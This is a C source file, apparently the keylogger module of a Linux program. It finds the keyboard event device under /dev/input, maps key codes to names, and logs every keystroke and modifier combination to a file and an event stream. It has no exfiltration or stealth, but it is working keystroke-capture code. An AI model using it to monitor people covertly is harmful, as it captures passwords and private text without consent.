#include "keylogger.h"

#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "behavior_subject.h"
#include "util.h"

static const KeyMap key_map[] = {
    [KEY_A] = {"a",           "A",           "A",           "a"          },
    [KEY_B] = {"b",           "B",           "B",           "b"          },
    [KEY_C] = {"c",           "C",           "C",           "c"          },
    [KEY_D] = {"d",           "D",           "D",           "d"          },
    [KEY_E] = {"e",           "E",           "E",           "e"          },
    [KEY_F] = {"f",           "F",           "F",           "f"          },
    [KEY_G] = {"g",           "G",           "G",           "g"          },
    [KEY_H] = {"h",           "H",           "H",           "h"          },
    [KEY_I] = {"i",           "I",           "I",           "i"          },
    [KEY_J] = {"j",           "J",           "J",           "j"          },
    [KEY_K] = {"k",           "K",           "K",           "k"          },
    [KEY_L] = {"l",           "L",           "L",           "l"          },
    [KEY_M] = {"m",           "M",           "M",           "m"          },
    [KEY_N] = {"n",           "N",           "N",           "n"          },
    [KEY_O] = {"o",           "O",           "O",           "o"          },
    [KEY_P] = {"p",           "P",           "P",           "p"          },
    [KEY_Q] = {"q",           "Q",           "Q",           "q"          },
    [KEY_R] = {"r",           "R",           "R",           "r"          },
    [KEY_S] = {"s",           "S",           "S",           "s"          },
    [KEY_T] = {"t",           "T",           "T",           "t"          },
    [KEY_U] = {"u",           "U",           "U",           "u"          },
    [KEY_V] = {"v",           "V",           "V",           "v"          },
    [KEY_W] = {"w",           "W",           "W",           "w"          },
    [KEY_X] = {"x",           "X",           "X",           "x"          },
    [KEY_Y] = {"y",           "Y",           "Y",           "y"          },
    [KEY_Z] = {"z",           "Z",           "Z",           "z"          },
    [KEY_0] = {"0",           ")",           "0",           ")"          },
    [KEY_1] = {"1",           "!",           "1",           "!"          },
    [KEY_2] = {"2",           "@",           "2",           "@"          },
    [KEY_3] = {"3",           "#",           "3",           "#"          },
    [KEY_4] = {"4",           "$",           "4",           "$"          },
    [KEY_5] = {"5",           "%",           "5",           "%"          },
    [KEY_6] = {"6",           "^",           "6",           "^"          },
    [KEY_7] = {"7",           "&",           "7",           "&"          },
    [KEY_8] = {"8",           "*",           "8",           "*"          },
    [KEY_9] = {"9",           "(",           "9",           "("          },
    [KEY_SPACE] = {"Space",       "Space",       "Space",       "Space"      },
    [KEY_ENTER] = {"Enter",       "Enter",       "Enter",       "Enter"      },
    [KEY_BACKSPACE] = {"Backspace",   "Backspace",   "Backspace",   "Backspace"  },
    [KEY_TAB] = {"Tab",         "Tab",         "Tab",         "Tab"        },
    [KEY_ESC] = {"Esc",         "Esc",         "Esc",         "Esc"        },
    [KEY_COMMA] = {",",           "<",           ",",           "<"          },
    [KEY_DOT] = {".",           ">",           ".",           ">"          },
    [KEY_SLASH] = {"/",           "?",           "/",           "?"          },
    [KEY_SEMICOLON] = {";",           ":",           ";",           ":"          },
    [KEY_APOSTROPHE] = {"'",           "\"",          "'",           "\""         },
    [KEY_LEFTBRACE] = {"[",           "{",           "[",           "{"          },
    [KEY_RIGHTBRACE] = {"]",           "}",           "]",           "}"          },
    [KEY_MINUS] = {"-",           "_",           "-",           "_"          },
    [KEY_EQUAL] = {"=",           "+",           "=",           "+"          },
    [KEY_GRAVE] = {"`",           "~",           "`",           "~"          },
    [KEY_BACKSLASH] = {"\\",          "|",           "\\",          "|"          },
    [KEY_KPASTERISK] = {"*",           "*",           "*",           "*"          },
    [KEY_KPPLUS] = {"+",           "+",           "+",           "+"          },
    [KEY_KPMINUS] = {"-",           "-",           "-",           "-"          },
    [KEY_KPDOT] = {".",           ".",           ".",           "."          },
    [KEY_KP0] = {"KP_0",        "KP_0",        "KP_0",        "KP_0"       },
    [KEY_KP1] = {"KP_1",        "KP_1",        "KP_1",        "KP_1"       },
    [KEY_KP2] = {"KP_2",        "KP_2",        "KP_2",        "KP_2"       },
    [KEY_KP3] = {"KP_3",        "KP_3",        "KP_3",        "KP_3"       },
    [KEY_KP4] = {"KP_4",        "KP_4",        "KP_4",        "KP_4"       },
    [KEY_KP5] = {"KP_5",        "KP_5",        "KP_5",        "KP_5"       },
    [KEY_KP6] = {"KP_6",        "KP_6",        "KP_6",        "KP_6"       },
    [KEY_KP7] = {"KP_7",        "KP_7",        "KP_7",        "KP_7"       },
    [KEY_KP8] = {"KP_8",        "KP_8",        "KP_8",        "KP_8"       },
    [KEY_KP9] = {"KP_9",        "KP_9",        "KP_9",        "KP_9"       },
    [KEY_UP] = {"Arrow Up",    "Arrow Up",    "Arrow Up",    "Arrow Up"   },
    [KEY_DOWN] = {"Arrow Down",  "Arrow Down",  "Arrow Down",  "Arrow Down" },
    [KEY_LEFT] = {"Arrow Left",  "Arrow Left",  "Arrow Left",  "Arrow Left" },
    [KEY_RIGHT] = {"Arrow Right", "Arrow Right", "Arrow Right", "Arrow Right"},
    [KEY_HOME] = {"Home",        "Home",        "Home",        "Home"       },
    [KEY_DELETE] = {"Del",         "Del",         "Del",         "Del"        },
    [KEY_CAPSLOCK] = {"CapsLock",    "CapsLock",    "CapsLock",    "CapsLock"   },
};

const char *get_key_name(uint16_t key_code, bool shift_pressed, bool capslock_active) {
    if (key_code < (sizeof(key_map) / sizeof(key_map[0])) && key_map[key_code].normal != NULL) {
        if (shift_pressed && capslock_active) {
            return key_map[key_code].shifted_and_capslocked;
        }
        if (capslock_active) {
            return key_map[key_code].capslocked;
        }
        if (shift_pressed) {
            return key_map[key_code].shifted;
        }
        return key_map[key_code].normal;
    }
    return "UNKNOWN";
}

char *find_keyboard_device(const char *target_device_name) {
    if (target_device_name) {
        return mstrdup(target_device_name);
    }

    DIR *dir;
    struct dirent *ent;
    const char base_path[] = "/dev/input/";

    if (!(dir = opendir(base_path))) {
        fprintf(stderr, "Cannot access /dev/input\n");
        return NULL;
    }

    char device_path[256];
    while ((ent = readdir(dir)) != NULL) {
        if (strncmp(ent->d_name, "event", 5) == 0) {
            snprintf(device_path, sizeof(device_path), "%s%s", base_path, ent->d_name);
            int fd = open(device_path, O_RDONLY);
            if (fd == -1) {
                continue;
            }
            char name[BUFFER_SIZE] = "Unknown";
            if (ioctl(fd, EVIOCGNAME(sizeof(name) - 1), name) >= 0) {
                // Convert to lowercase for comparison
                for (size_t i = 0; name[i] != '\0'; i++) {
                    name[i] = (char)tolower((unsigned char)name[i]);
                }
                if (strstr(name, "keyboard")) {
                    closedir(dir);
                    close(fd);
                    return mstrdup(device_path);
                }
            }
            close(fd);
        }
    }

    closedir(dir);
    return NULL;
}

char *get_keyboard_name(const char *path) {
    if (!path || !strstr(path, "/dev/input/event")) {
        fprintf(stderr, "Keyboard path must be in /dev/input/event*\n");
        return NULL;
    }

    const char *last = strrchr(path, '/');
    if (!last) {
        fprintf(stderr, "Invalid keyboard path %s\n", path);
        return NULL;
    }

    const char *event = last + 1;
    size_t sys_path_size = snprintf(NULL, 0, SYS_PATH_DEVICE_NAME, event) + 1;
    char *sys_path_buff = malloc(sys_path_size);
    if (!sys_path_buff) {
        perror("malloc");
        return NULL;
    }
    snprintf(sys_path_buff, sys_path_size, SYS_PATH_DEVICE_NAME, event);

    FILE *file = fopen(sys_path_buff, "r");
    free(sys_path_buff);
    if (!file) {
        perror("fopen");
        return NULL;
    }

    char tmp[256];
    if (!fgets(tmp, sizeof(tmp), file)) {
        fclose(file);
        return NULL;
    }
    fclose(file);

    // Remove newline if present
    size_t len = strlen(tmp);
    if (len > 0 && tmp[len - 1] == '\n') {
        tmp[len - 1] = '\0';
    }

    return mstrdup(tmp);
}

void log_key(FILE *f, BehaviorSubject *subject, bool ctrl_pressed, bool meta_pressed, bool alt_pressed,
             const char *key_name) {
    if (!key_name) return;

    bool is_modifier = (strcmp(key_name, "Shift") == 0 || strcmp(key_name, "Ctrl") == 0 ||
                        strcmp(key_name, "Meta") == 0 || strcmp(key_name, "Alt") == 0);

    if (is_modifier) {
        next(subject, key_name);
        if (f) fprintf(f, "%s\n", key_name);
        return;
    }

    char combined_key[MAX_KEY_LEN] = {0};
    size_t pos = 0;

    if (ctrl_pressed) {
        size_t len = strlen("Ctrl+");
        if (pos + len < MAX_KEY_LEN) {
            memcpy(combined_key + pos, "Ctrl+", len);
            pos += len;
        }
    }
    if (meta_pressed) {
        size_t len = strlen("Meta+");
        if (pos + len < MAX_KEY_LEN) {
            memcpy(combined_key + pos, "Meta+", len);
            pos += len;
        }
    }
    if (alt_pressed) {
        size_t len = strlen("Alt+");
        if (pos + len < MAX_KEY_LEN) {
            memcpy(combined_key + pos, "Alt+", len);
            pos += len;
        }
    }

    size_t key_len = strlen(key_name);
    if (pos + key_len < MAX_KEY_LEN) {
        memcpy(combined_key + pos, key_name, key_len);
        combined_key[pos + key_len] = '\0';
    } else {
        combined_key[pos] = '\0';
    }

    next(subject, combined_key);
    if (f) fprintf(f, "%s\n", combined_key);
}
